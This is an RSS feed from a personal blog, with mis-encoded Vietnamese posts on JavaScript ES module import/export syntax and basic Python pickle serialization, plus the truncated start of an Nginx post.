<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Rayinaw</title>
    <link>https://rayinaw.github.io/</link>
    
    <atom:link href="https://rayinaw.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>æ¥å¹´ã®äº‹ã‚’è¨€ãˆã°é¬¼ãŒç¬‘ã†</description>
    <pubDate>Tue, 25 Apr 2023 18:08:17 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>javascript-learning-journey</title>
      <link>https://rayinaw.github.io/2023/04/25/javascript-learning-journey/</link>
      <guid>https://rayinaw.github.io/2023/04/25/javascript-learning-journey/</guid>
      <pubDate>Tue, 25 Apr 2023 12:12:33 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Import-va-Export&quot;&gt;&lt;a href=&quot;#Import-va-Export&quot; class=&quot;headerlink&quot; title=&quot;Import vÃ  Export&quot;&gt;&lt;/a&gt;Import vÃ  Export&lt;/h2&gt;&lt;h3 id=&quot;Export-tr</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Import-va-Export"><a href="#Import-va-Export" class="headerlink" title="Import vÃ  Export"></a>Import vÃ  Export</h2><h3 id="Export-truoc-declarations"><a href="#Export-truoc-declarations" class="headerlink" title="Export trÆ°á»›c declarations"></a>Export trÆ°á»›c declarations</h3><p>Ta cÃ³ thá»ƒ dÃ¡n nhÃ£n exported cho báº¥t ká»³ declaration cá»§a variable, function hay class.</p><p>VÃ­ dá»¥:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export an array</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> months = [<span class="string">&#x27;Jan&#x27;</span>, <span class="string">&#x27;Feb&#x27;</span>, <span class="string">&#x27;Mar&#x27;</span>,<span class="string">&#x27;Apr&#x27;</span>, <span class="string">&#x27;Aug&#x27;</span>, <span class="string">&#x27;Sep&#x27;</span>, <span class="string">&#x27;Oct&#x27;</span>, <span class="string">&#x27;Nov&#x27;</span>, <span class="string">&#x27;Dec&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// export a constant</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">MODULES_BECAME_STANDARD_YEAR</span> = <span class="number">2015</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// export a class</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><blockquote><p>KhÃ´ng thÃªm dáº¥u cháº¥m pháº©y sau export class&#x2F;function. </p></blockquote><blockquote><p><code>Export</code> trÆ°á»›c class&#x2F;function khÃ´ng tÆ°Æ¡ng á»©ng vá»›i <a href="https://javascript.info/function-expressions">function expression</a></p></blockquote><blockquote><p>Most JavaScript style guides donâ€™t recommend semicolons after function and class declarations.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params">user</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">`Hello, <span class="subst">$&#123;user&#125;</span>!`</span>);</span><br><span class="line">&#125;  <span class="comment">// no ; at the end</span></span><br></pre></td></tr></table></figure><hr><h3 id="Export-ngoai-khoi-tao"><a href="#Export-ngoai-khoi-tao" class="headerlink" title="Export ngoÃ i khá»Ÿi táº¡o"></a>Export ngoÃ i khá»Ÿi táº¡o</h3><p>Ta cÃ³ thá»ƒ Ä‘áº·t export riÃªng vá»›i viá»‡c khá»Ÿi táº¡o.</p><p>VÃ­ dá»¥:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ say.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params">user</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`Hello <span class="subst">$&#123;user&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayBy</span>(<span class="params">user</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`Bye, <span class="subst">$&#123;user&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;sayHi, sayBye&#125;; <span class="comment">//List nhá»¯ng biáº¿n exported</span></span><br></pre></td></tr></table></figure><p>NgoÃ i ra, chÃºng ta cÅ©ng cÃ³ thá»ƒ <code>export</code> trÆ°á»›c khi khá»Ÿi táº¡o cÃ¡c function Ä‘Ã³.</p><h2 id="Import"><a href="#Import" class="headerlink" title="Import *"></a>Import *</h2><p>Ta cÃ³ thá»ƒ Ä‘áº·t list cÃ¡c hÃ m, biáº¿n hay class muá»‘n import bÃªn trong <code>import &#123;...&#125;</code> nhÆ°:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;sayHi, sayBye&#125; <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayHi</span>(<span class="string">&#x27;John&#x27;</span>); <span class="comment">// Hello, John!</span></span><br><span class="line"><span class="title function_">sayBye</span>(<span class="string">&#x27;John&#x27;</span>); <span class="comment">// Bye, John!</span></span><br></pre></td></tr></table></figure><p>Hoáº·c náº¿u nhiá»u thá»© Ä‘á»ƒ import, ta cÃ³ thá»ƒ import nhÆ° sau:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ main.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> say <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span></span><br><span class="line"></span><br><span class="line">say.<span class="title function_">sayHi</span>(<span class="string">&#x27;John&#x27;</span>);</span><br><span class="line">say.<span class="title function_">sayHi</span>(<span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Tuy import táº¥t cáº£ trÃ´ng cÃ³ váº» tiá»‡n hÆ¡n nhÆ°ng ta nÃªn liá»‡t kÃª rÃµ tÃªn cáº§n Ä‘á»ƒ import:</p><ul><li>TÃªn ngáº¯n hÆ¡n: <code>sayHi</code> thay vÃ¬ say.sayHi()</li><li>Cho cÃ¡i nhÃ¬n tá»‘t hÆ¡n vá» tá»•ng quan cáº¥u trÃºc cá»§a code: CÃ¡i nÃ o Ä‘Æ°á»£c dÃ¹ng vÃ  tá»« Ä‘Ã¢u.</li></ul><h3 id="Import-â€œasâ€"><a href="#Import-â€œasâ€" class="headerlink" title="Import â€œasâ€"></a>Import â€œasâ€</h3><p>Ta cÃ³ thá»ƒ sá»­ dá»¥ng keyword <code>as</code> Ä‘á»ƒ import dÆ°á»›i tÃªn khÃ¡c:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;sayHi <span class="keyword">as</span> hi, sayBye <span class="keyword">as</span> bye&#125; <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">hi</span>(<span class="string">&#x27;John&#x27;</span>); <span class="comment">// Hello, John!</span></span><br><span class="line"><span class="title function_">bye</span>(<span class="string">&#x27;John&#x27;</span>); <span class="comment">// Bye, John!</span></span><br></pre></td></tr></table></figure><h3 id="Export-â€œasâ€"><a href="#Export-â€œasâ€" class="headerlink" title="Export â€œasâ€"></a>Export â€œasâ€</h3><p>TÆ°Æ¡ng tá»± vá»›i <code>import</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ğŸ“ say.js</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">export</span> &#123;sayHi <span class="keyword">as</span> hi, sayBye <span class="keyword">as</span> bye&#125;</span><br></pre></td></tr></table></figure><p>BÃ¢y giá», ta cÃ³ thá»ƒ sá»­ dá»¥ng <code>hi</code> vÃ  <code>bye</code> bÃªn ngoÃ i:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ğŸ“ main.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> say <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line">say.<span class="title function_">hi</span>(<span class="string">&#x27;John&#x27;</span>);</span><br><span class="line">say.<span class="title function_">bye</span>(<span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Export-default"><a href="#Export-default" class="headerlink" title="Export default"></a>Export default</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ user.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123; <span class="comment">// just add &quot;default&quot;</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Chá»‰ duy nháº¥t má»™t <code>export default</code> trÃªn má»™t file.<br>Vá»›i <code>export default</code> ta cÃ³ thá»ƒ <code>import</code> nÃ³ mÃ  khÃ´ng cáº§n dÃ¹ng Ä‘áº¿n {â€¦}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ğŸ“ main.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th>Named export</th><th>Default export</th></tr></thead><tbody><tr><td>export class User {â€¦}</td><td>export default class User {â€¦}</td></tr><tr><td>import {User} from â€¦</td><td>import User from â€¦</td></tr></tbody></table><p>VÃ¬ tÃ­nh duy nháº¥t cá»§a <code>export default</code>, do Ä‘Ã³ ta cÃ³ thá»ƒ khÃ´ng cáº§n Ä‘á»‹nh nghÄ©a tÃªn hÃ m&#x2F;biáº¿n&#x2F;func.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> &#123; <span class="comment">// no class name</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params">user</span>) &#123; <span class="comment">// no function name</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">`Hello, <span class="subst">$&#123;user&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export a single value, without making a variable</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> [<span class="string">&#x27;Jan&#x27;</span>, <span class="string">&#x27;Feb&#x27;</span>, <span class="string">&#x27;Mar&#x27;</span>,<span class="string">&#x27;Apr&#x27;</span>, <span class="string">&#x27;Aug&#x27;</span>, <span class="string">&#x27;Sep&#x27;</span>, <span class="string">&#x27;Oct&#x27;</span>, <span class="string">&#x27;Nov&#x27;</span>, <span class="string">&#x27;Dec&#x27;</span>];</span><br></pre></td></tr></table></figure><p>Khi Ä‘Ã³ ta import khÃ´ng sá»­ dá»¥ng <code>&#123;...&#125;</code> sáº½ tá»± hiá»ƒu:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;Rayinaw&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">name</span>);</span><br></pre></td></tr></table></figure><p>VÃ  hiá»ƒn nhiÃªn, nhÆ° nÃ y sáº½ gÃ¢y ra lá»—i:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> &#123; <span class="comment">// Error! (non-default export needs a name)</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="The-â€œdefaultâ€-name"><a href="#The-â€œdefaultâ€-name" class="headerlink" title="The â€œdefaultâ€ name"></a>The â€œdefaultâ€ name</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params">user</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">`Hello, <span class="subst">$&#123;user&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// same as if we added &quot;export default&quot; before the function</span></span><br><span class="line"><span class="keyword">export</span> &#123;sayHi <span class="keyword">as</span> <span class="keyword">default</span>&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>Khi import bÃ¬nh thÆ°á»ng, ta pháº£i xÃ¡c Ä‘á»‹nh Ä‘Ãºng tÃªn Ä‘Ã£ export</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">User</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line"><span class="comment">// import &#123;MyUser&#125; won&#x27;t work, the name must be &#123;User&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>Vá»›i export default, ta cÃ³ thá»ƒ sá»­ dá»¥ng báº¥t cá»© tÃªn nÃ o ta muá»‘n.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>; <span class="comment">// works</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">MyUser</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>; <span class="comment">// works too</span></span><br><span class="line"><span class="comment">// could be import Anything... and it&#x27;ll still work</span></span><br></pre></td></tr></table></figure><p>Äá»ƒ trÃ¡nh nháº§m láº«n vÃ  nhiá»u ngÆ°á»i chung project import khÃ¡c tÃªn, ngÆ°á»i ta quy Æ°á»›c Ä‘áº·t tÃªn theo tÃªn file:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">LoginForm</span> <span class="keyword">from</span> <span class="string">&#x27;./loginForm.js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> func <span class="keyword">from</span> <span class="string">&#x27;/path/to/func.js&#x27;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Re-export"><a href="#Re-export" class="headerlink" title="Re-export"></a>Re-export</h3><p>Re-export <code>export ... from ...</code> cho phÃ©p import vÃ  export Ä‘á»“ng thá»i nhÆ°:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;sayHi&#125; <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span>; <span class="comment">// re-export sayHi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;<span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">User</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>; <span class="comment">// re-export default</span></span><br></pre></td></tr></table></figure><p>Lá»£i Ã­ch khi Re-export:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auth/</span><br><span class="line">    index.<span class="property">js</span></span><br><span class="line">    user.<span class="property">js</span></span><br><span class="line">    helpers.<span class="property">js</span></span><br><span class="line">    tests/</span><br><span class="line">        login.<span class="property">js</span></span><br><span class="line">    providers/</span><br><span class="line">        github.<span class="property">js</span></span><br><span class="line">        facebook.<span class="property">js</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><ul><li>Export tiá»‡n hÆ¡n: Khi sá»­ dá»¥ng package auth, ta cÃ³ thá»ƒ import cÃ¡c module trá»±c tiáº¿p tá»« main file â€œindex.jsâ€</li></ul><p><code>import &#123;login, logout&#125; from &#39;auth/index.js&#39;</code></p><p>The â€œmain fileâ€, <code>auth/index.js</code> exports all the functionality that weâ€™d like to provide in our package.</p><ul><li>NgÆ°á»i sá»­ dá»¥ng package khÃ´ng cáº§n biáº¿n Ä‘áº¿n cáº¥u trÃºc, cÃ¡c gÃ³i bÃªn trong Ä‘á»ƒ import.<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ auth/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// import login/logout and immediately export them</span></span><br><span class="line"><span class="keyword">import</span> &#123;login, logout&#125; <span class="keyword">from</span> <span class="string">&#x27;./helpers.js&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;login, logout&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import default as User and export it</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;<span class="title class_">User</span>&#125;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><p>Now users of our package can import {login} from â€œauth&#x2F;index.jsâ€.</p><p>The syntax export â€¦ from â€¦ is just a shorter notation for such import-export:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ auth/index.js</span></span><br><span class="line"><span class="comment">// re-export login/logout</span></span><br><span class="line"><span class="keyword">export</span> &#123;login, logout&#125; <span class="keyword">from</span> <span class="string">&#x27;./helpers.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// re-export the default export as User</span></span><br><span class="line"><span class="keyword">export</span> &#123;<span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">User</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Re-exporting-the-default-export"><a href="#Re-exporting-the-default-export" class="headerlink" title="Re-exporting the default export"></a>Re-exporting the default export</h3><p>Default export cáº§n xá»­ lÃ½ má»™t cÃ¡ch riÃªng láº» khi re-exporting:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ“ user.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can come across two problems with it:</p><ol><li><p><code>export User from &#39;./user.js&#39;</code> wonâ€™t work. That would lead to a syntax error.</p><p> To re-export the default export, we have to write export {default as User}, as in the example above.</p></li><li><p><code>export * from &#39;./user.js&#39;</code> re-exports only named exports, but ignores the default one.</p><p> If weâ€™d like to re-export both named and default exports, then two statements are needed:</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>; <span class="comment">// to re-export named exports</span></span><br><span class="line"><span class="keyword">export</span> &#123;<span class="keyword">default</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./user.js&#x27;</span>; <span class="comment">// to re-export the default export</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://rayinaw.github.io/2023/04/25/javascript-learning-journey/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pickle-learning</title>
      <link>https://rayinaw.github.io/2023/04/24/pickle-learning/</link>
      <guid>https://rayinaw.github.io/2023/04/24/pickle-learning/</guid>
      <pubDate>Mon, 24 Apr 2023 14:37:31 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Pickle&quot;&gt;&lt;a href=&quot;#Pickle&quot; class=&quot;headerlink&quot; title=&quot;Pickle&quot;&gt;&lt;/a&gt;Pickle&lt;/h1&gt;&lt;h2 id=&quot;Khai-niem&quot;&gt;&lt;a href=&quot;#Khai-niem&quot; class=&quot;headerlink</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><h2 id="Khai-niem"><a href="#Khai-niem" class="headerlink" title="KhÃ¡i niá»‡m"></a>KhÃ¡i niá»‡m</h2><p>Documentation: <a href="https://docs.python.org/3/library/pickle.html">https://docs.python.org/3/library/pickle.html</a></p><p>Pickle lÃ  module cá»§a python dÃ¹ng Ä‘á»ƒ serialize hay de-serialize cÃ¡c Ä‘á»‘i tÆ°á»£ng trong python.</p><h2 id="Phuong-thuc-co-ban"><a href="#Phuong-thuc-co-ban" class="headerlink" title="PhÆ°Æ¡ng thá»©c cÆ¡ báº£n"></a>PhÆ°Æ¡ng thá»©c cÆ¡ báº£n</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump(obj, file)</span><br><span class="line"><span class="comment"># Serialize má»™t Ä‘á»‘i tÆ°á»£ng vÃ  ghi nÃ³ xuá»‘ng má»™t file. Má»Ÿ báº±ng cháº¿ Ä‘á»™ wb (write binary)</span></span><br><span class="line">pickle.dumps(obj)</span><br><span class="line"><span class="comment"># Serialize má»™t Ä‘á»‘i tÆ°á»£ng vÃ  tráº£ vá» trá»± tiáº¿p bytes</span></span><br><span class="line"></span><br><span class="line">pickle.load(file)</span><br><span class="line"><span class="comment"># Deserialize file nhá»‹ phÃ¢n. File Ä‘Æ°á»£c má»Ÿ báº±ng cháº¿ Ä‘á»™ rb (read binary)</span></span><br><span class="line">pickle.loads(data)</span><br><span class="line"><span class="comment"># Deserialize trá»±c tiáº¿p tá»« bytes</span></span><br></pre></td></tr></table></figure><p>VÃ­ dá»¥:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">obj=<span class="string">&#x27;rayinaw&#x27;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;data&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(obj,f)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python sample.py</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00\x8c\x07rayinaw\x94.&#x27;</span></span><br><span class="line"><span class="string">rayinaw</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://rayinaw.github.io/2023/04/24/pickle-learning/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Nginx Learning Journey</title>
      <link>https://rayinaw.github.io/2023/04/15/nginx-learning/</link>
      <guid>https://rayinaw.github.io/2023/04/15/nginx-learning/</guid>
      <pubDate>Sat, 15 Apr 2023 04:55:36 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Cau-hinh&quot;&gt;&lt;a href=&quot;#Cau-hinh&quot; class=&quot;headerlink&quot; title=&quot;Cáº¥u hÃ¬nh&quot;&gt;&lt;/a&gt;Cáº¥u hÃ¬nh&lt;/h2&gt;&lt;p&gt;YÃªu cáº§u: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sá»­ dá»¥ng HDH linux, á»Ÿ Ä‘Ã¢</description>
        
      
      
      
